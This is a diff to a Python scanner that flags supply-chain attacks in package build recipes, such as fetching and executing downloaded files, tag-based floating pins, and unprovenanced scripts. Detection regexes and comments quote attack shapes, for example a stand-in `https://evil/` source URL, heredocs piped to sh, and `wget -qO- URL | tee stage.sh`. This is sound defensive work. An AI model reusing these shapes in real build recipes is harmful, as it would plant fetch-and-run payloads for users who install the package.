@@ -40,6 +40,7 @@ from ..config import (
 )
 from ..deps import _strip_comment
 from ..findings import stamp
+from ..line_lex import lex_lines
 from ..rules import (
     MAX_RULE_LINE_BYTES,
     ScopeResolver,
@@ -476,6 +477,12 @@ def _heredoc_body_indices_cached(lines: tuple[str, ...]) -> frozenset[int]:
     """
     body: set[int] = set()
     delims: list[tuple[str, bool]] = []
+    # The lexer owns opener detection: a `<<` inside a comment or a quoted
+    # string is prose.  Scanning the raw line here disagreed with
+    # line_lex._scan and turned `# upstream uses the <<EOF form` above a
+    # fetch into a fake delimiter that blanked every following line - and
+    # with it H069/H072/H082/H083 for the whole function.
+    lexed = lex_lines(list(lines))
     for i, line in enumerate(lines):
         content = line[1:] if line[:1] in ("+", "-") else line
         stripped = content.strip()
@@ -486,20 +493,19 @@ def _heredoc_body_indices_cached(lines: tuple[str, ...]) -> frozenset[int]:
             if delims[-1][1]:
                 body.add(i)
             continue
-        for m in _HEREDOC_OPEN_RE.finditer(content):
-            if m.group(2):
-                # The destination may be named on either side of the
-                # delimiter: `bash <<EOF` puts it before, and
-                # `cat <<'EOF' | sh` puts it after the redirect.  Reading
-                # only the left half meant the piped form - which is how
-                # the shape is usually written - stayed classified as data.
-                is_data = not (
-                    _HEREDOC_TO_INTERPRETER_RE.search(content[:m.start()])
-                    or _HEREDOC_PIPED_RE.search(content[m.end():])
-                    or _HEREDOC_TO_EXECUTING_CONFIG_RE.search(content)
-                )
-                delims.append((m.group(2), is_data))
-                break
+        opener = lexed[i].heredoc_opener
+        if opener is not None:
+            # The destination may be named on either side of the
+            # delimiter: `bash <<EOF` puts it before, and
+            # `cat <<'EOF' | sh` puts it after the redirect.  Reading
+            # only the left half meant the piped form - which is how
+            # the shape is usually written - stayed classified as data.
+            is_data = not (
+                _HEREDOC_TO_INTERPRETER_RE.search(content)
+                or _HEREDOC_PIPED_RE.search(content)
+                or _HEREDOC_TO_EXECUTING_CONFIG_RE.search(content)
+            )
+            delims.append((opener[0], is_data))
     return frozenset(body)
 
 
@@ -617,6 +623,10 @@ _EXECUTION_RE = re.compile(
     # them.  `pwsh -File f` rides the flag run like every other verb.
     r"(?:busybox\s+)?(?:/[\w./-]*/)?(?:bash|sh|zsh|dash|ksh|ash|mksh"
     r"|node|php|lua(?:jit)?|tclsh|fish"
+    # `python3 setup.py build` runs the script file exactly as `bash s.sh`
+    # does; the flag run already absorbs `-c`/`-m`, and a captured code
+    # string only pairs if its basename equals a fetched name.
+    r"|python[23]?|perl|ruby"
     r"|escript|fennel|zx|guile|racket|pwsh|julia|Rscript|deno|bun|elixir"
     r"|ts-node|gjs|csi|bb|babashka|clj|janet)"
     r"(?:\s+-{1,2}[A-Za-z-]*)*\s+(?![<>-])"
@@ -700,7 +710,9 @@ _H072_BENIGN_EXEC = frozenset({
 #: for the build tree, they are exactly where unread code lives, and
 #: rejecting every `$` rejected the one case this test exists to allow.
 _BUILD_ROOT_RE = re.compile(
-    r"\A[\"']*\$\{?(?:srcdir|startdir|pkgdir|PWD|BUILDDIR)\}?/")
+    # The quote may close before the slash (`"$srcdir"/stage.sh`), so the
+    # optional closing quote sits between the root name and the `/`.
+    r"\A[\"']*\$\{?(?:srcdir|startdir|pkgdir|PWD|BUILDDIR)\}?[\"']?/")
 _NOT_A_PATH_RE = re.compile(r"\A-|[*?\[\]{}$%`]|\A\.{2,}\Z")
 
 
@@ -727,11 +739,12 @@ def _is_directory_path(p: str) -> bool:
     executes it". A directory is neither written as a payload nor executed.
     """
     return p.endswith("/") or not os.path.basename(p.rstrip())
-
-
 def _norm_path(p: str) -> str:
     """Normalise a recipe path for comparison."""
-    p = p.strip().strip('"\'')
+    p = p.strip()
+    # Shell quoting is syntax, never part of the filename: a token may be
+    # `"$srcdir"/stage.sh` (quote closes mid-token) or `'$srcdir'/x`.
+    p = p.replace('"', "").replace("'", "")
     p = re.sub(r"^\$\{(?:srcdir|pkgdir|startdir|BUILDDIR)\}/?", "", p)
     p = re.sub(r"^\$(?:srcdir|pkgdir|startdir|BUILDDIR)/?", "", p)
     p = re.sub(r"^\./", "", p)
@@ -949,6 +962,18 @@ def _declared_source_basenames_cached(text: str, whole_file: bool) -> frozenset[
     if whole_file:
         lines = [" " + ln for ln in lines]
     from ..file_kinds import files_at_line, is_srcinfo_file
+    from ..tokenizer import variable_table as _variable_table
+
+    # `source=("https://evil/${pkgname}.sh")` downloads under the resolved
+    # name; the tables resolve the scalars the recipe itself declares.
+    _vars, _arrs = _variable_table(
+        [ln[1:] if ln[:1] in ("+", " ") else ln for ln in lines])
+
+    def _subst(ent: str) -> str:
+        for key in sorted(_vars, key=len, reverse=True):
+            value = _vars[key]
+            ent = ent.replace("${" + key + "}", value).replace("$" + key, value)
+        return ent
 
     files = files_at_line(lines)
     basenames: set[str] = set()
@@ -1010,6 +1035,7 @@ def _declared_source_basenames_cached(text: str, whole_file: bool) -> frozenset[
                 continue
             if _VCS_SOURCE_RE.search(ent):
                 continue
+            ent = _subst(ent)
             base = ent.split("::", 1)[0] if "::" in ent else _source_basename(ent)
             if base:
                 basenames.add(base)
@@ -1048,11 +1074,19 @@ def _source_urls_by_local_name(recipe) -> dict[str, tuple[str, object | None]]:
             continue
         spans = recipe.array_spans.get(array, ())
         for index, entry in enumerate(entries):
+            # `source=("'git+https://…'")` carries the inner quotes as part
+            # of the value; they are quoting, not part of the address.
+            entry = entry.strip("\"'")
             name, sep, url = entry.partition("::")
             if not sep:
                 url = name
                 name = _source_basename(url)
-            if not name or not _URL_HOST_RE.match(url):
+            url = url.strip("\"'")
+            # A VCS transport without `://` (`bzr+lp:user/proj`) is still
+            # a source entry the pinning rules compare; only a bare local
+            # file has no address to swap.
+            if not name or not (_URL_HOST_RE.match(url)
+                                or _VCS_SOURCE_RE.match(url)):
                 continue
             span = spans[index] if index < len(spans) else None
             # Last occurrence wins: a diff fragment can show a name twice,
@@ -1128,14 +1162,18 @@ _FLOATING_PATH_RE = re.compile(r"/(?:latest|HEAD)(?:/|$)")
 def _pinning_of(url: str) -> str:
     """``"pinned"`` or ``"floating"`` for one source URL (H101).
 
-    A VCS entry is pinned by a `#commit=`/`#tag=` fragment and floating on
-    a branch ref, HEAD, or no fragment at all.  A plain archive URL is
-    floating only when it names a moving target (`/latest/`, `/HEAD`);
-    every other archive carries its version in the path by convention.
+    A VCS entry is pinned by a `#commit=` fragment and floating on a
+    branch ref, a tag, HEAD, or no fragment at all: a tag is a movable ref,
+    and force-moving one is the classic supply-chain attack.  A plain
+    archive URL is floating only when it names a moving target
+    (`/latest/`, `/HEAD`); every other archive carries its version in the
+    path by convention.
     """
     fragment = url.split("#", 1)[1] if "#" in url else ""
-    if url.startswith(("git+", "git://")) or fragment:
-        if fragment.startswith(("commit=", "tag=")):
+    # Any `transport+address` spelling (`git+`, `hg+`, `bzr+lp:`) is a VCS
+    # fetch: floating without a commit fragment, whatever the transport.
+    if re.match(r"\w+\+", url) or url.startswith("git://") or fragment:
+        if fragment.startswith("commit="):
             return "pinned"
         return "floating"
     if _FLOATING_PATH_RE.search(url):
@@ -1145,26 +1183,43 @@ def _pinning_of(url: str) -> str:
 
 def pinning_lost(
     diff_text: str,
-) -> list[tuple[str, str, str, object | None]]:
-    """``(local name, old url, new url, span)`` where an entry went pinned
-    to floating (H101).
+) -> list[tuple[str, str, str, object | None, bool]]:
+    """``(local name, old url, new url, span, renamed)`` where an entry went
+    pinned to floating (H101).
 
     P008 flags a floating source wherever it stands; the transition rule
     catches the moment a verifiable package becomes upstream-controlled,
     which in a watch replay is the signal that matters.  Only same-name
-    entries on both sides compare, the H099 keying.
+    entries on both sides compare, the H099 keying.  *renamed* is True when
+    the local name itself changed - a pinned tarball replaced by a floating
+    VCS entry under a new name, a stronger loss than a pin moving in place.
     """
     pre, post = _recipe_states(diff_text)
     old = _source_urls_by_local_name(pre)
     new = _source_urls_by_local_name(post)
-    lost: list[tuple[str, str, str, object | None]] = []
+    lost: list[tuple[str, str, str, object | None, bool]] = []
     for name in sorted(set(old) & set(new)):
         old_url = old[name][0]
         new_url, new_span = new[name]
         if old_url == new_url:
             continue
         if _pinning_of(old_url) == "pinned" and _pinning_of(new_url) == "floating":
-            lost.append((name, old_url, new_url, new_span))
+            lost.append((name, old_url, new_url, new_span, False))
+    if lost:
+        return lost
+    # A rename carries the same lost pinning under a new local name: the
+    # pinned `v1.0.0.tar.gz` is deleted and a floating
+    # `git+https://…/repo.git` appears in its place.  Comparing only
+    # same-name entries let that swap score nothing.
+    gone_pinned = [n for n in old
+                   if n not in new and _pinning_of(old[n][0]) == "pinned"]
+    new_floating = [n for n in new
+                    if n not in old and _pinning_of(new[n][0]) == "floating"]
+    if gone_pinned and new_floating:
+        old_name = gone_pinned[0]
+        new_name = new_floating[0]
+        lost.append((new_name, old[old_name][0],
+                     new[new_name][0], new[new_name][1], True))
     return lost
 
 
@@ -1436,6 +1491,11 @@ _OUTPUT_FLAG_CLIENTS = (
 _LINE_URL_RE = re.compile(r"\b[a-z][a-z0-9+.-]{0,20}://[^\s;&|'\"]+",
                           re.IGNORECASE)
 
+#: `wget -i urls` / `aria2c --input-file=urls`: the addresses live in a
+#: file, not on the command line.
+_INPUT_FILE_RE = re.compile(
+    r"(?:^|\s)(?:-i|--input-file)[= ](\"[^\"]+\"|'[^']+'|\S+)")
+
 _FETCH_OUTPUT_RE = re.compile(
     # Lower-case `-o` takes an argument for every client here, glued
     # (`-o"f"`, `-o$f`) or spaced.  `(?![-\s])` keeps `-o-` (stdout) and a
@@ -1464,6 +1524,15 @@ _FETCH_OUTPUT_RE = re.compile(
     r"|\b(?:" + _OUTPUT_FLAG_CLIENTS + r")\b"
     r"[^;&|]*?>\s*"
     r"(?P<redir_path>(?:\"[^\"]*\"|'[^']*'|\\.|[^\s;&|])+)"
+    # A redirect that belongs to a later stage of the same pipeline:
+    # `printf … | openssl s_client … | sed … > stage` writes the fetch's
+    # bytes through the pipeline into the file, but the `>` sits after a
+    # pipe, which the close-coupled arm above refuses to cross.  The
+    # caller already gated on a fetch client being on the line at all.
+    # Only a redirect reaching end-of-line counts: a `>` inside a quoted
+    # argument (`printf 'a > b'`) is data.
+    r"|(?:\A|[^0-9>&])>+\s*"
+    r"(?P<pipeline_redir>(?:\"[^\"]*\"|'[^']*'|\\.|[^\s;&|])+)\s*$"
     # A stdout-dash fetch piped to tee names its file there:
     # `wget -qO- URL | tee stage.sh` and `curl -o- URL | tee f`.
     r"|\b(?:curl|wget2?|aria2c|axel)\b[^;&|]*?"
@@ -1624,11 +1693,12 @@ def _collect_fetch_outputs(body: str,
     for m in _FETCH_OUTPUT_RE.finditer(body):
         raw = (m.group("path") or m.group("wget_path")
                or m.group("long_path") or m.group("doc_path")
-               or m.group("redir_path") or m.group("tee_path")
+               or m.group("redir_path") or m.group("pipeline_redir")
+               or m.group("tee_path")
                or m.group("dest") or m.group("store_dest") or "")
         # A URL is a source, not a destination.  `curl -O URL` takes no
         # argument, so whatever follows it is the address being fetched.
-        if raw and "://" not in raw:
+        if raw and "://" not in raw and not raw.startswith("/dev/"):
             path = _norm_path(raw)
             if path:
                 paths.append(path)
@@ -1740,6 +1810,12 @@ def edge_fetch_then_execute(ctx, add) -> None:
     #: line then runs.
     fetched_by_fn: dict[str, list[tuple[str, bool]]] = {}
     cloned_by_fn: dict[str, list[tuple[str, bool]]] = {}
+    #: path -> basenames of the URLs a heredoc wrote into that file
+    #: (`cat > urls <<EOF` + URL lines): `wget -i urls` fetches those
+    #: addresses without one appearing on the client's own line.
+    url_inputs: dict[str, list[str]] = {}
+    #: The write the current line's heredoc (if any) is filling.
+    heredoc_path = ""
     #: (phase rank, line index, client, fetch scope) for fetches whose
     #: destination the grammar cannot name.  A scheme-bearing URL is left
     #: to H016/H082's attributed arm, so one command is not scored twice -
@@ -1751,11 +1827,23 @@ def edge_fetch_then_execute(ctx, add) -> None:
         if line.startswith("-"):
             continue
         fn = scopes.within(i, _FETCH_SCOPE_FUNCTIONS)
-        if fn is None or i in heredoc_body:
+        if i in heredoc_body:
+            # A heredoc that wrote a file (`cat > urls <<EOF`) fills it
+            # with its body; a URL line there is the address `wget -i urls`
+            # fetches, with none on the client's own line.
+            if fn is not None and heredoc_path and len(line) <= MAX_RULE_LINE_BYTES:
+                for u in _LINE_URL_RE.findall(line):
+                    base = _source_basename(u)
+                    if base:
+                        url_inputs.setdefault(heredoc_path, []).append(base)
+            continue
+        if fn is None:
             continue
         if len(line) > MAX_RULE_LINE_BYTES:
             continue
         body = _strip_comment(line[1:])
+        writes = [w for _k, w in _collect_writes(body, fn) if w]
+        heredoc_path = _norm_path(writes[-1]) if writes else ""
         outputs = _collect_fetch_outputs(body, declared_urls)
         for path in outputs:
             fetched_by_fn.setdefault(fn, []).append(
@@ -1764,6 +1852,11 @@ def edge_fetch_then_execute(ctx, add) -> None:
             cloned_by_fn.setdefault(fn, []).append(
                 (directory, line.startswith("+")))
         client = _FETCH_CLIENT_RE.search(body)
+        if client:
+            for m in _INPUT_FILE_RE.finditer(body):
+                for base in url_inputs.get(_norm_path(m.group(1)), ()):
+                    fetched_by_fn.setdefault(fn, []).append(
+                        (base, line.startswith("+")))
         if (client and (not outputs or "://" not in body)
                 and not claims_pipe_to_shell(body)
                 and not claims_upload_line(body, config)):
@@ -1908,9 +2001,15 @@ _SOURCE_EXEC_RE = re.compile(
     r"(?:bash|sh|zsh|dash|ksh|python3?|perl|ruby|node|php|lua(?:jit)?"
     r"|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh"
     r"|julia|Rscript|bun|deno|escript|fennel|zx|guile|racket|pwsh|elixir"
-    r"|ts-node|gjs|csi|bb|babashka|clj|janet)\s+(?![<>])(\S+)"
-    r"|source\s+(\S+)"
-    r"|\.\s+(\S+)"
+    r"|ts-node|gjs|csi|bb|babashka|clj|janet)\s+(?![<>])"
+    # A quoted path may contain a space (`bash "$srcdir/stage .sh"`,
+    # where the declared source URL itself carries the space): the quote
+    # bounds the argument, so the space is part of the filename.  A quote
+    # may also close before the path ends (`"$srcdir"/stage.sh`), and the
+    # glued suffix belongs to the same token.
+    r"(\"[^\s;&|]*\"[^\s;&|]*|'[^'\s;&|]*'[^\s;&|]*|[^\s;&|]+)"
+    r"|source\s+(?:\"([^\"]+)\"|'([^']+)'|(\S+))"
+    r"|\.\s+(?:\"([^\"]+)\"|'([^']+)'|(\S+))"
     r")"
     # A bare `./script` is a command, so it must be at a command position.
     # Without the anchor the bare `\./` matched anywhere, capturing `647.patch`
@@ -1931,6 +2030,11 @@ _SOURCE_EXEC_RE = re.compile(
     re.IGNORECASE,
 )
 
+#: A URL's trailing `\x00` escape never reaches the on-disk name - the
+#: filesystem and makepkg truncate at the NUL - so `stage.sh\x00` and
+#: `stage.sh` are one file.
+_NUL_SUFFIX_RE = re.compile(r"(?:\\x00|\\0|\\u0000)+$")
+
 
 def edge_source_file_execution(ctx, add) -> None:
     """H083 predicate over the shared graph context.
@@ -1941,6 +2045,20 @@ def edge_source_file_execution(ctx, add) -> None:
     """
     source_basenames = ctx.source_basenames
     foreign_bases = ctx.foreign_declared_bases
+    #: Declared local names that a `name::url` rename invented: the local
+    #: name is not the URL's own basename, so the payload wears the name.
+    _url_bases = {_source_basename(u) for u in ctx.declared_urls}
+    disguised_bases = {
+        s for s in source_basenames if s not in _url_bases
+    }
+    # `source=("https://evil/${url:-stage.sh}")` downloads under the
+    # expansion's fallback when the variable is unset - which is the fresh
+    # environment an AUR helper builds in - so `bash "$srcdir/stage.sh"`
+    # executes that declared download.
+    fallback_names = {
+        s.rsplit(":-", 1)[1].rstrip("}").rsplit("/", 1)[-1]
+        for s in source_basenames if ":-" in s
+    }
     #: fn -> {renamed basename: declared source basename}.  A transform that
     #: reads a declared file and writes a new name (`awk '1' "$srcdir/x" >
     #: run.me`) makes the new name the same payload.
@@ -1973,18 +2091,42 @@ def edge_source_file_execution(ctx, add) -> None:
             if not raw:
                 continue
             if _not_a_path(raw):
-                continue
+                # A glob that still names a file (`bash "$srcdir"/*.sh`)
+                # executes the declared source pattern `https://…/*.sh`.
+                # The same holds for the literal `$` of `stage$.sh` and the
+                # brace characters of `stage{}.sh` - neither is an
+                # expansion; a bare `*` or a real `${var}` stays rejected.
+                bare = _BUILD_ROOT_RE.sub("", _norm_path(raw)).strip("\"'")
+                probe = re.sub(r"[*?]", "", bare)
+                probe = re.sub(r"\$(?![\w{(])", "", probe)
+                probe = re.sub(r"(?<!\$)[\[\]{}]", "", probe)
+                if not ("." in os.path.basename(bare)
+                        and not re.search(r"[\[\]{}%`$]", probe)):
+                    continue
             path = _norm_path(raw)
             base = os.path.basename(path)
             if not base:
                 continue
-            if base in _H072_BENIGN_EXEC and base not in foreign_bases:
+            # A URL's trailing `\x00` escape never reaches the filename -
+            # the filesystem and makepkg truncate at the NUL - so the
+            # declared `stage.sh\x00` and the executed `stage.sh` are one
+            # file.
+            cbase = _NUL_SUFFIX_RE.sub("", base)
+            declared = {_NUL_SUFFIX_RE.sub("", s) for s in source_basenames}
+            # A benign build name is exempt when it is the upstream's own
+            # file (its declared name is the URL's own basename) or comes
+            # from a host trusted relative to `url=`.  It stops being
+            # ordinary when a `name::url` rename ships a payload under a
+            # benign name (`configure::https://…/stage`) or the host is
+            # foreign: then the filename is a disguise, not provenance.
+            if (base in _H072_BENIGN_EXEC and base not in foreign_bases
+                    and base not in disguised_bases):
                 continue
             if patch_base and base == patch_base:
                 continue
             alias_of = aliases_by_fn.get(fn, {}).get(base)
-            if base in source_basenames:
-                message = f"{fn}() executes declared source file {base}"
+            if cbase in declared or cbase in fallback_names:
+                message = f"{fn}() executes declared source file {cbase}"
             elif alias_of:
                 message = (f"{fn}() executes {base}, a rename of declared "
                            f"source file {alias_of}")
@@ -1992,6 +2134,67 @@ def edge_source_file_execution(ctx, add) -> None:
                 continue
             add("H083", "Downloaded Source File Executed", "HIGH", "execution",
                 message,
+                line=_find_line(ctx.diff_text, raw.strip().strip('"\'')[:60] or base),
+                position=fn, path=path)
+            return
+
+
+# ---------------------------------------------------------------------------
+# X033 - file with no provenance executed from the source root
+# ---------------------------------------------------------------------------
+
+def edge_undeclared_provenance_execution(ctx, add) -> None:
+    """X033 predicate: a ``$srcdir``-root file with no provenance is run.
+
+    ``bash "$srcdir"/stage.sh`` where ``stage.sh`` is not a declared
+    source, not written by the recipe, and not the unpacked content of a
+    checksummed tarball (which lands in a subdirectory) — the file came
+    from nowhere.  H083 fires only on declared names; this covers the
+    undeclared complement that the source-array campaign identified as a
+    total silence.
+    """
+    source_basenames = ctx.source_basenames
+    written: set[str] = set()
+    for i, line in enumerate(ctx.lines):
+        if line.startswith("-") or i in ctx.heredoc_body:
+            continue
+        fn = ctx.scopes.within(i, _BUILD_FUNCTIONS)
+        if fn is None or len(line) > MAX_RULE_LINE_BYTES:
+            continue
+        body = _strip_comment(line[1:])
+        for _kind, wpath in _collect_writes(body, fn):
+            if wpath:
+                written.add(os.path.basename(wpath))
+    for i, line in enumerate(ctx.lines):
+        if not line.startswith("+") or i in ctx.heredoc_body:
+            continue
+        fn = ctx.scopes.within(i, _BUILD_FUNCTIONS)
+        if fn is None or len(line) > MAX_RULE_LINE_BYTES:
+            continue
+        body = _strip_comment(line[1:])
+        for m in _SOURCE_EXEC_RE.finditer(body):
+            raw = next((g for g in m.groups() if g), None)
+            if not raw:
+                continue
+            path = _norm_path(raw)
+            # Only a ``$srcdir``-root file: legitimate build scripts live
+            # inside the unpacked tree (``$srcdir/pkg-ver/stage.sh``) or
+            # are reached by a relative path after ``cd``; the root is
+            # where a bare download lands.  The strip is on the raw token
+            # because ``_norm_path`` has already removed the root prefix
+            # and with it the evidence of which root it was.
+            bare = _BUILD_ROOT_RE.sub("", raw).strip("\"'")
+            if not bare or "/" in bare:
+                continue
+            base = bare
+            if (base in source_basenames or base in written
+                    or base in _H072_BENIGN_EXEC):
+                continue
+            if _FETCH_CLIENT_RE.search(body):
+                continue  # H082 owns the fetch-then-execute chain
+            add("X033", "File With No Provenance Executed", "HIGH", "execution",
+                f"{fn}() executes {base}, a file that is neither a declared "
+                "source, a build artifact, nor written by the recipe",
                 line=_find_line(ctx.diff_text, raw.strip().strip('"\'')[:60] or base),
                 position=fn, path=path)
             return
@@ -2989,6 +3192,7 @@ def _delivery_findings(
     run_edge_instances(ctx, add, only=frozenset({"H072"}))
     run_edge_instances(ctx, add, only=frozenset({"H082"}))
     run_edge_instances(ctx, add, only=frozenset({"H083"}))
+    run_edge_instances(ctx, add, only=frozenset({"X033"}))
     run_persistence_instances(ctx, add, only=frozenset({"H084"}))
     run_persistence_instances(ctx, add, only=frozenset({"H085"}))
     _committed_execution_findings(
